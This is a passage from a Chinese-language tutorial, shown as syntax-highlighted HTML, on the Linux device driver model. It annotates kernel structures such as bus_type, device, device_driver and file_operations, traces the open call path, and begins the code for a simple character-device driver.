keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> pm_message_t state<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以使该总线上的一个设备脱离睡眠模式</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resume<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以找出该总线上的一个设备支持多少个虚拟设备功能</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>num_vf<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以在该总线上的设备配置DMA</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>dma_configure<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//该总线的电源管理操作，回调特定的设备驱动的pm-ops</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dev_pm_ops</span> <span class="token operator">*</span>pm<span class="token punctuation">;</span>    <span class="token comment">//此总线的IOMMU具体操作，用于将IOMMU驱动程序实现到总线上</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iommu_ops</span> <span class="token operator">*</span>iommu_ops<span class="token punctuation">;</span>    <span class="token comment">//驱动核心的私有数据，只有驱动核心能够接触这个</span>    <span class="token keyword">struct</span> <span class="token class-name">subsys_private</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">lock_class_key</span> lock_key<span class="token punctuation">;</span>    <span class="token comment">//当探测或移除该总线上的一个设备时，设备驱动核心应该锁定该设备</span>    bool need_parent_lock<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>其中 <code>subsys_private</code> 是总线的驱动核心的私有数据，通过 bus_kset 可以找到所有的 kset，通过 kset 又能找到 subsys_private，再通过subsys_private就可以找到总线了，也可以找到该总线上所有的设备与驱动</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//通过kobject找到对应的subsys_private</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">to_subsys_private</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token function">container_of</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">subsys_private</span><span class="token punctuation">,</span> subsys<span class="token punctuation">.</span>kobj<span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">subsys_private</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">kset</span> subsys<span class="token punctuation">;</span><span class="token comment">//定义这个子系统结构的kset</span>    <span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token operator">*</span>devices_kset<span class="token punctuation">;</span><span class="token comment">//该总线的"设备"目录，包含所有的设备</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> interfaces<span class="token punctuation">;</span><span class="token comment">//总线相关接口的列表</span>    <span class="token keyword">struct</span> <span class="token class-name">mutex</span> mutex<span class="token punctuation">;</span><span class="token comment">//保护设备，和接口列表</span>    <span class="token keyword">struct</span> <span class="token class-name">kset</span> <span class="token operator">*</span>drivers_kset<span class="token punctuation">;</span><span class="token comment">//该总线的"驱动"目录，包含所有的驱动</span>    <span class="token keyword">struct</span> <span class="token class-name">klist</span> klist_devices<span class="token punctuation">;</span><span class="token comment">//挂载总线上所有设备的可迭代链表</span>    <span class="token keyword">struct</span> <span class="token class-name">klist</span> klist_drivers<span class="token punctuation">;</span><span class="token comment">//挂载总线上所有驱动的可迭代链表</span>    <span class="token keyword">struct</span> <span class="token class-name">blocking_notifier_head</span> bus_notifier<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> drivers_autoprobe<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">bus_type</span> <span class="token operator">*</span>bus<span class="token punctuation">;</span>   <span class="token comment">//指向所属总线</span>    <span class="token keyword">struct</span> <span class="token class-name">kset</span> glue_dirs<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">class</span> <span class="token operator">*</span>class<span class="token punctuation">;</span><span class="token comment">//指向这个结构所关联类结构的指针</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="设备">设备</h5><ul><li><p>Linux 使用 <code>device</code> 结构体表示一个设备，里面包含了一个设备的所有信息，其中有总线和驱动指针，这能帮助设备找到自己的驱动程序和总线</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">kobject</span> kobj<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">device</span>       <span class="token operator">*</span>parent<span class="token punctuation">;</span><span class="token comment">//指向父设备</span>    <span class="token keyword">struct</span> <span class="token class-name">device_private</span>   <span class="token operator">*</span>p<span class="token punctuation">;</span><span class="token comment">//设备的私有数据</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>init_name<span class="token punctuation">;</span> <span class="token comment">//设备初始化名字</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">device_type</span> <span class="token operator">*</span>type<span class="token punctuation">;</span><span class="token comment">//设备类型</span>    <span class="token keyword">struct</span> <span class="token class-name">bus_type</span> <span class="token operator">*</span>bus<span class="token punctuation">;</span>  <span class="token comment">//指向设备所属总线</span>    <span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">;</span><span class="token comment">//指向设备的驱动</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>platform_data<span class="token punctuation">;</span><span class="token comment">//设备平台数据</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>driver_data<span class="token punctuation">;</span><span class="token comment">//设备驱动的私有数据</span>    <span class="token keyword">struct</span> <span class="token class-name">dev_links_info</span>   links<span class="token punctuation">;</span><span class="token comment">//设备供应商链接</span>    <span class="token keyword">struct</span> <span class="token class-name">dev_pm_info</span>  power<span class="token punctuation">;</span><span class="token comment">//用于设备的电源管理</span>    <span class="token keyword">struct</span> <span class="token class-name">dev_pm_domain</span>    <span class="token operator">*</span>pm_domain<span class="token punctuation">;</span><span class="token comment">//提供在系统暂停时执行调用</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_GENERIC_MSI_IRQ</span></span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    msi_list<span class="token punctuation">;</span><span class="token comment">//主机的MSI描述符链表</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">struct</span> <span class="token class-name">dev_archdata</span> archdata<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">device_node</span>  <span class="token operator">*</span>of_node<span class="token punctuation">;</span> <span class="token comment">//用访问设备树节点</span>    <span class="token keyword">struct</span> <span class="token class-name">fwnode_handle</span>    <span class="token operator">*</span>fwnode<span class="token punctuation">;</span> <span class="token comment">//设备固件节点</span>    dev_t           devt<span class="token punctuation">;</span>   <span class="token comment">//用于创建sysfs "dev"</span>    u32         id<span class="token punctuation">;</span> <span class="token comment">//设备实例id</span>    spinlock_t      devres_lock<span class="token punctuation">;</span><span class="token comment">//设备资源链表锁</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    devres_head<span class="token punctuation">;</span><span class="token comment">//设备资源链表</span>    <span class="token keyword">struct</span> <span class="token class-name">class</span>        <span class="token operator">*</span>class<span class="token punctuation">;</span><span class="token comment">//设备的类</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>groups<span class="token punctuation">;</span>  <span class="token comment">//可选的属性组</span>    <span class="token keyword">void</span>    <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在所有引用结束后释放设备</span>    <span class="token keyword">struct</span> <span class="token class-name">iommu_group</span>  <span class="token operator">*</span>iommu_group<span class="token punctuation">;</span><span class="token comment">//该设备属于的IOMMU组</span>    <span class="token keyword">struct</span> <span class="token class-name">dev_iommu</span>    <span class="token operator">*</span>iommu<span class="token punctuation">;</span><span class="token comment">//每个设备的通用IOMMU运行时数据</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>device 结构中同样包含了 kobject，这使得设备可以加入 kset 和 kobject 组建的层次结构中</p></li></ul><h5 id="驱动">驱动</h5><ul><li><p>Linux 中 <code>device_driver</code> 结构表示一个驱动，其中包含了驱动程序的相关信息，结构中包含了驱动程序的名字、驱动程序所在模块、设备探查和电源相关的回调函数的指针</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token comment">//驱动名称</span>    <span class="token keyword">struct</span> <span class="token class-name">bus_type</span>     <span class="token operator">*</span>bus<span class="token punctuation">;</span><span class="token comment">//指向总线</span>    <span class="token keyword">struct</span> <span class="token class-name">module</span>       <span class="token operator">*</span>owner<span class="token punctuation">;</span><span class="token comment">//模块持有者</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>mod_name<span class="token punctuation">;</span><span class="token comment">//用于内置模块</span>    bool suppress_bind_attrs<span class="token punctuation">;</span><span class="token comment">//禁用通过sysfs的绑定/解绑</span>    <span class="token keyword">enum</span> <span class="token class-name">probe_type</span> probe_type<span class="token punctuation">;</span><span class="token comment">//要使用的探查类型（同步或异步）</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">of_device_id</span>   <span class="token operator">*</span>of_match_table<span class="token punctuation">;</span><span class="token comment">//开放固件表</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">acpi_device_id</span> <span class="token operator">*</span>acpi_match_table<span class="token punctuation">;</span><span class="token comment">//ACPI匹配表</span>    <span class="token comment">//被调用来查询一个特定设备的存在</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>probe<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//将设备状态同步到软件状态时调用</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sync_state<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当设备被从系统中移除时被调用，以便解除设备与该驱动的绑定</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>remove<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关机时调用，使设备停止</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>shutdown<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以使设备进入睡眠模式，通常是进入一个低功率状态</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>suspend<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> pm_message_t state<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//调用以使设备从睡眠模式中恢复</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resume<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//默认属性</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>groups<span class="token punctuation">;</span>    <span class="token comment">//绑定设备的属性</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>dev_groups<span class="token punctuation">;</span>    <span class="token comment">//设备电源操作</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">dev_pm_ops</span> <span class="token operator">*</span>pm<span class="token punctuation">;</span>    <span class="token comment">//当sysfs目录被写入时被调用</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>coredump<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//驱动程序私有数据</span>    <span class="token keyword">struct</span> <span class="token class-name">driver_private</span> <span class="token operator">*</span>p<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>driver_private</code> 结构中同样包含 kobject，用于组织所有的驱动，还指向驱动本身，这和 bus_type 中的 subsys_private 结构的机制如出一辙</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">driver_private</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">kobject</span> kobj<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">klist</span> klist_devices<span class="token punctuation">;</span><span class="token comment">//驱动管理的所有设备的链表</span>    <span class="token keyword">struct</span> <span class="token class-name">klist_node</span> knode_bus<span class="token punctuation">;</span><span class="token comment">//加入bus链表的节点</span>    <span class="token keyword">struct</span> <span class="token class-name">module_kobject</span> <span class="token operator">*</span>mkobj<span class="token punctuation">;</span><span class="token comment">//指向用kobject管理模块节点</span>    <span class="token keyword">struct</span> <span class="token class-name">device_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">;</span><span class="token comment">//指向驱动本身</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="文件操作函数">文件操作函数</h4><ul><li><p>在前面驱动程序核心数据结构的基础上，Linux 系统中提供了更为高级的封装，Linux 将设备分成几类分别是：字符设备、块设备、网络设备以及杂项设备</p><table><thead><tr><th>设备类型</th><th>描述&amp;举例</th></tr></thead><tbody><tr><td>字符设备</td><td>以字节流形式被访问的设备，比如字符终端和串口设备</td></tr><tr><td>块设备</td><td>以数据块形式被访问的设备，比如硬盘、光盘</td></tr><tr><td>网络设备</td><td>主机与主机之间进行数据交换的设备</td></tr><tr><td>杂项设备</td><td>一些不符合 LInux 预先确定的字符设备划分为杂项设备</td></tr></tbody></table></li><li><p>以杂项设备为例，Linux 用 <code>miscdevice</code> 结构表示一个杂项设备，它一般在驱动程序代码文件中静态定义</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">miscdevice</span>  <span class="token punctuation">{</span>    <span class="token keyword">int</span> minor<span class="token punctuation">;</span><span class="token comment">//设备号</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token comment">//设备名称</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>fops<span class="token punctuation">;</span><span class="token comment">//文件操作函数结构</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span><span class="token comment">//链表</span>    <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>parent<span class="token punctuation">;</span><span class="token comment">//指向父设备的device结构</span>    <span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>this_device<span class="token punctuation">;</span><span class="token comment">//指向本设备的device结构</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">attribute_group</span> <span class="token operator">*</span><span class="token operator">*</span>groups<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>nodename<span class="token punctuation">;</span><span class="token comment">//节点名字</span>    umode_t mode<span class="token punctuation">;</span><span class="token comment">//访问权限</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>this_device</code> 指针指向下层的、属于这个杂项设备的 <code>device</code> 结构</p></li><li><p>设备一经注册就会在 sys 相关的目录下建立设备对应的文件结点，对这个文件结点打开、读写等操作，最终会调用到驱动程序对应的函数，而对应的函数指针就保存在 <code>file_operations</code> 结构中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">module</span> <span class="token operator">*</span>owner<span class="token punctuation">;</span><span class="token comment">//所在的模块</span>    <span class="token function">loff_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>llseek<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> loff_t<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调整读写偏移</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>read<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">,</span> loff_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读</span>    <span class="token function">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>write<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> size_t<span class="token punctuation">,</span> loff_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>mmap<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">vm_area_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//映射</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>flush<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> fl_owner_t id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//刷新</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭</span><span class="token punctuation">}</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>以打开操作为例看 Linux 如何调用到 file_operations 结构中的函数：打开系统调用接口 → <code>filp_open</code> 函数 → <code>file_open_name</code> 函数 → <code>do_filp_open</code> 函数 → <code>path_openat</code> 函数 → <code>do_o_path</code> 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">do_o_path</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">nameidata</span> <span class="token operator">*</span>nd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> flags<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">path</span> path<span class="token punctuation">;</span><span class="token keyword">int</span> error <span class="token operator">=</span> <span class="token function">path_lookupat</span><span class="token punctuation">(</span>nd<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">audit_inode</span><span class="token punctuation">(</span>nd<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> path<span class="token punctuation">.</span>dentry<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error <span class="token operator">=</span> <span class="token function">vfs_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> file<span class="token punctuation">,</span> <span class="token function">current_cred</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">path_put</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> error<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">vfs_open</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">path</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">{</span>    file<span class="token operator">-&gt;</span>f_path <span class="token operator">=</span> <span class="token operator">*</span>path<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">do_dentry_open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token function">d_backing_inode</span><span class="token punctuation">(</span>path<span class="token operator">-&gt;</span>dentry<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">do_dentry_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>open<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//省略</span>    f<span class="token operator">-&gt;</span>f_op <span class="token operator">=</span> <span class="token function">fops_get</span><span class="token punctuation">(</span>inode<span class="token operator">-&gt;</span>i_fop<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取文件节点的file_operations</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>open<span class="token punctuation">)</span><span class="token comment">//如果open为空则调用file_operations结构中的open函数</span>        open <span class="token operator">=</span> f<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span>open<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>open<span class="token punctuation">)</span> <span class="token punctuation">{</span>        error <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>inode<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//省略</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>file_operations 结构的地址存在一个文件的 inode 结构中，在 Linux 系统中，都是用 inode 结构表示一个文件，不管它是数据文件还是设备文件</p></blockquote></li></ul><h3 id="实现简单字符设备驱动">实现简单字符设备驱动</h3><blockquote><p>环境 ubuntu 20.04，内核版本 5.4.0-54-generic</p></blockquote><ol><li><p>编写hello驱动代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/moduleparam.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/wait.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/poll.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">BUFFER_MAX</span>    <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">OK</span>            <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ERROR</span>         <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">cdev</span> <span class="token operator">*</span>gDev<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>gFile<span class="token punctuation">;</span>dev_t  devNum<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> subDevNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_major  <span class="token operator">=</span>  <span class="token number">232</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_minor <span class="token operator">=</span>   <span class="token number">0</span><span class="token 